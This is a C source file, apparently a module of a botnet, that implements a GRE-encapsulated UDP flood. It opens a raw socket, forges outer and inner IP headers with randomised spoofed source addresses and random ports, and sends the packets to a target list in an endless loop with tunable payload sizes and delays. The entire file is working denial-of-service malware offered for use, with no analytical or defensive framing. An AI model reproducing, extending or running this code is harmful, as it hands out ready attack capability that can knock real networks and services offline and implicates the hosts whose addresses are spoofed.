#include <linux/if_ether.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <linux/ip.h>
#include <linux/udp.h>

#include "bot/definitions.h"
#include "bot/modules/flood.h"
#include "bot/utils/network.h"
#include "bot/utils/xoshiro.h"

#define PROTO_GRE_TRANS_ETH 0x6558

struct grehdr {
  uint16_t opts, protocol;
};

void flood_greip(pflood_context_t ctx) {
  char **packets = calloc(ctx->num_targs, sizeof(char *));

  size_t payload_len = 0;
  size_t buffer_len = 0;
  uint8_t *buffer = NULL;

  // port options
  u16 dport = flood_retrieve_u16(ctx, OPT_DPORT, 0);
  u16 sport = flood_retrieve_u16(ctx, OPT_SPORT, 0);

  // len options
  u16 len = flood_retrieve_u16(ctx, OPT_LEN, 512);
  u16 minlen = flood_retrieve_u16(ctx, OPT_MINLEN, 0);
  u16 maxlen = flood_retrieve_u16(ctx, OPT_MAXLEN, 0);
  u32 psleep = flood_retrieve_u32(ctx, OPT_SLEEP, 0);

  u8 random = flood_retrieve_u32(ctx, OPT_RANDOMIZE, true);
  pu8 payload = flood_retrieve_bytes(ctx, OPT_PAYLOAD, &payload_len);

  if (!random) {
    buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
  }

  int fd = -1;
  if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_GRE)) == -1) {
    exit(0);
  }

  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &(int[]){1}, sizeof(int)) == -1) {
    close(fd);
    exit(0);
  }

  for (int i = 0; i < ctx->num_targs; i++) {
    packets[i] = calloc(1510, sizeof(char));
    memset(packets[i], '\0', 1510);

    struct iphdr *iph = (struct iphdr *)packets[i];
    struct grehdr *greh = (struct grehdr *)(iph + 1);
    struct iphdr *greiph = (struct iphdr *)(greh + 1);
    struct udphdr *udph = (struct udphdr *)(greiph + 1);
    char *data = (char *)(udph + 1);

    iph->version = IPVERSION;
    iph->ttl = IPDEFTTL;
    iph->protocol = IPPROTO_GRE;
    iph->ihl = 5;
    iph->tos = 0;
    iph->saddr = network_local_addr();

    greh->opts = 0;
    greh->protocol = htons(ETH_P_IP);

    greiph->version = IPVERSION;
    greiph->ttl = IPDEFTTL;
    greiph->protocol = IPPROTO_UDP;
    greiph->ihl = 5;
    greiph->tos = 0;
    greiph->frag_off = htons(1 << 14);

    if (!random) {
      buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
      memcpy(data, buffer, buffer_len);
    }
  }

  while (true) {
    // send targets
    for (int i = 0; i < ctx->num_targs; i++) {
      ptarget_t target = &ctx->targets[i];
      target_random_addr(target);

      struct iphdr *iph = (struct iphdr *)packets[i];
      struct grehdr *greh = (struct grehdr *)(iph + 1);
      struct iphdr *greiph = (struct iphdr *)(greh + 1);
      struct udphdr *udph = (struct udphdr *)(greiph + 1);
      char *data = (char *)(udph + 1);

      if (random) {
        buffer = flood_generate(!payload ? len : payload_len, minlen, maxlen, payload, &buffer_len);
        memcpy(data, buffer, buffer_len);
      }

      iph->daddr = target->address;
      iph->id = xoshiro_next() & 0xFFFF;

      greiph->id = ~(iph->id - 1000);
      greiph->saddr = xoshiro_next() & 0xFFFFFFFF;
      greiph->daddr = ~(greiph->saddr - 1024);

      udph->source = htons(!sport ? xoshiro_next() & 0xFFFF : sport);
      udph->dest = htons(!dport ? xoshiro_next() & 0xFFFF : dport);
      udph->len = htons(sizeof(struct udphdr) + buffer_len);

      uint16_t udp_len = sizeof(struct udphdr) + buffer_len;
      udph->len = htons(udp_len);

      uint16_t inner_ip_len = sizeof(struct iphdr) + udp_len;
      greiph->tot_len = htons(inner_ip_len);

      uint16_t total_len = sizeof(struct iphdr) + sizeof(struct grehdr) + inner_ip_len;
      iph->tot_len = htons(total_len);

      iph->check = 0;
      iph->check = csum_compute(iph, sizeof(struct iphdr));

      greiph->check = 0;
      greiph->check = csum_compute(greiph, sizeof(struct iphdr));

      udph->check = 0;
      udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof(struct udphdr) + buffer_len);

      sendto(fd, packets[i], ntohs(iph->tot_len), MSG_NOSIGNAL, (struct sockaddr *)&target->saddr,
             sizeof(struct sockaddr_in));

      if (random) {
        free(buffer);
        buffer = NULL;
      }
    }

    if (psleep > 0) usleep(psleep);
  }
}
